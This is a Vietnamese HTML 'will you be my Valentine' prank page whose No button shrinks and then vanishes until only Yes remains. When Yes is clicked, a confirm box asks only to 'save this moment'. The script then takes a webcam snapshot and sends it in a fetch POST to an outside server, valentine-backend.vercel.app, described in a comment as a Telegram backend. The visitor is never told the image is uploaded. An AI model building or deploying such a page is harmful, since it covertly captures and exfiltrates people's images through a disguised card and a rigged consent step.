<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Cẩn thận bắt sáng cam 💖</title>
<style>
body {
  margin: 0;
  padding: 0;
  height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-family: Arial;
  background-color: #f5c6cb; /* Nền hồng */
  overflow: hidden;
}

#gifContainer img {
  width: 350px;
  max-width: 80vw;
  margin-bottom: 20px;
}

#buttonRow {
  display: flex;
  gap: 20px;
}

button {
  padding: 12px 25px;
  font-size: 18px;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  transition: all 0.3s ease;
}

#yesBtn {
  background: #28a745;
  color: white;
}

#noBtn {
  background: #dc3545;
  color: white;
}

h1 {
  margin-bottom: 20px;
  color: #ff3366; /* Màu chữ hồng đậm */
}
</style>
</head>
<body>

<h1 id="title">Cậu có muốn Valentine cùng tớ không? 💌</h1>

<div id="gifContainer">
  <!-- Dùng một GIF con mèo xanh dương duy nhất -->
  <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif">
</div>

<div id="buttonRow">
  <button id="yesBtn">Đồng ý 💖</button>
  <button id="noBtn">Từ chối 😢</button>
</div>

<audio id="music" loop autoplay>
  <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg">
</audio>

<script>
const yesBtn = document.getElementById("yesBtn");
const noBtn = document.getElementById("noBtn");
const mainGif = document.getElementById("mainGif");
const title = document.getElementById("title");

let hoverCount = 0;
const maxHover = 6;
let yesFontSize = 18;

// GIF con mèo xanh dương thay đổi mỗi lần Từ chối
const catGif = "https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif"; // GIF mèo xanh dương

// Chữ từ chối mỗi lần bấm
const noTexts = ["Thật không? 😢", "Suy nghĩ lại đi 🥺", "Đừng mà 😭", "Bấm nhầm đúng không 😏", "Cho cơ hội đi 💔", "Lần cuối đấy 😎"];
noBtn.addEventListener("click", () => {
  if (hoverCount >= maxHover) return;

  // Chuyển GIF mèo mỗi lần bấm
  mainGif.src = catGif;

  // Tăng font-size Đồng ý
  yesFontSize += 5;
  yesBtn.style.fontSize = yesFontSize + "px";

  // Thu nhỏ nút Từ chối + thay chữ
  noBtn.style.fontSize = (18 - 2 * hoverCount) + "px";
  noBtn.innerText = noTexts[hoverCount % noTexts.length];

  hoverCount++;

  // Sau lần cuối
  if (hoverCount === maxHover) {
    noBtn.style.display = "none";
    yesBtn.style.width = "100vw";
    yesBtn.style.height = "100vh";
    yesBtn.style.fontSize = "100px";
    yesBtn.style.position = "absolute";
    yesBtn.style.top = "0";
    yesBtn.style.left = "0";

    // Thay đổi GIF sau khi bấm Đồng ý
    mainGif.src = "https://media.giphy.com/media/l3vR1sAVgZ7TxJ7bC/giphy.gif"; // GIF mèo bị thỏ hôn
    title.innerText = "Yeahhh!! Tớ biết mà 💖💖💖";
  }
});

// Bấm Đồng ý → bật camera + gửi ảnh
yesBtn.addEventListener("click", async () => {
  const allow = confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
  if (!allow) return;

  try {
    const video = document.createElement("video");
    video.autoplay = true;
    video.style.width = "150px";
    video.style.position = "fixed";
    video.style.bottom = "10px";
    video.style.right = "10px";
    document.body.appendChild(video);
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");

    setTimeout(async () => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imgData = canvas.toDataURL("image/png");

      // Gửi ảnh lên backend Telegram
      await fetch("https://valentine-backend.vercel.app/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: imgData })
      });

      alert("Khoảnh khắc đã được lưu 💖");
      stream.getTracks().forEach(t => t.stop());
      video.remove();
    }, 1000);

  } catch (e) {
    alert("Không bật được camera 😢");
  }
});
</script>

</body>
</html>
